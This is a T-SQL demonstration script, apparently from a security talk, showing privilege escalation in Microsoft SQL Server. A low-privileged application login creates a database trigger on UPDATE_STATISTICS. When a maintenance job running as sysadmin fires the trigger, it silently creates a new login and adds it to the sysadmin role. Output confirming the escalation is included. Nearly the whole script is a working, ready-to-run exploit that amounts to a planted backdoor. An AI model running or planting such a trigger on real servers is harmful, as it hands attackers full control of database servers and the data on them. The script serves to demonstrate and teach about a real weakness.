/*
  Your MSSQL environment is vulnerable and I can prove it!
  Author: Fabiano Amorim | fabianonevesamorim@hotmail.com
*/

/*
  Step 1 - Check existing statistics
*/
USE DbAppDemo1
GO
EXEC AS LOGIN = 'AppDemo1'
GO
-- What can I do at server level?
SELECT * FROM sys.fn_my_permissions(NULL, 'SERVER')
GO
-- What can I do at db level?
SELECT * FROM sys.fn_my_permissions(NULL, 'DATABASE')
GO

/* Check stats */
SELECT sp.stats_id, name, filter_definition, last_updated, rows, rows_sampled, steps, unfiltered_rows, modification_counter   
FROM sys.stats AS stat   
CROSS APPLY sys.dm_db_stats_properties(stat.object_id, stat.stats_id) AS sp  
WHERE stat.object_id = object_id('TabTestUpdateStats');
GO

/* Run a "update" to make all stats outdated */
BEGIN TRAN
TRUNCATE TABLE TabTestUpdateStats
ROLLBACK TRAN
GO

/* Check modification_counter */
SELECT sp.stats_id, name, filter_definition, last_updated, rows, rows_sampled, steps, unfiltered_rows, modification_counter   
FROM sys.stats AS stat   
CROSS APPLY sys.dm_db_stats_properties(stat.object_id, stat.stats_id) AS sp  
WHERE stat.object_id = object_id('TabTestUpdateStats');
GO

/*
  Step 2 - Create a trigger to capture DDL events
*/
USE DbAppDemo1
GO
DROP TRIGGER IF EXISTS tr_DDL_1 ON DATABASE
GO
IF EXISTS(SELECT * FROM sys.triggers WHERE name = 'tr_DDL_1')
  DROP TRIGGER tr_DDL_1 ON DATABASE
GO
CREATE TRIGGER tr_DDL_1
ON DATABASE   
FOR UPDATE_STATISTICS
AS   
BEGIN
  BEGIN TRY
    -- Do I have permission to create a new login?
    IF EXISTS(SELECT * FROM sys.login_token WHERE name = 'sysadmin' AND usage = 'GRANT OR DENY')
    BEGIN
      IF SUSER_ID('*** Demo 1 - I Should Not Be Here I''m a SysAdmin now ***') IS NULL
      BEGIN
        CREATE LOGIN [*** Demo 1 - I Should Not Be Here I'm a SysAdmin now ***] WITH PASSWORD=N'complexpwd', CHECK_POLICY=OFF;
        ALTER SERVER ROLE [sysadmin] ADD MEMBER [*** Demo 1 - I Should Not Be Here I'm a SysAdmin now ***];
      END
    END
  END TRY
  BEGIN CATCH
    PRINT ERROR_MESSAGE()
  END CATCH
END
GO


/* 
  Step 3 - Run the job
  This will trigger the UPDATE STATISTICS DDL commands
*/
-- I don't wait to wait for the job schedule, so, let's force it...
REVERT;
GO
EXEC msdb.dbo.sp_start_job @job_name = N'Maintenance - UpdateStats'
GO

/* Stat was updated */
SELECT sp.stats_id, name, filter_definition, last_updated, rows, rows_sampled, steps, unfiltered_rows, modification_counter   
FROM sys.stats AS stat   
CROSS APPLY sys.dm_db_stats_properties(stat.object_id, stat.stats_id) AS sp  
WHERE stat.object_id = object_id('TabTestUpdateStats');
GO

/*
  Verify escalation: use the UI to show the [*** Demo 1 - I Should Not Be Here I''m a SysAdmin now ***]
*/
SELECT
  SUSER_ID('*** Demo 1 - I Should Not Be Here I''m a SysAdmin now ***') AS loginid,
  IS_SRVROLEMEMBER('sysadmin', '*** Demo 1 - I Should Not Be Here I''m a SysAdmin now ***') AS is_sysadmin;
GO
/*
loginid     is_sysadmin
----------- ----------
381         1
*/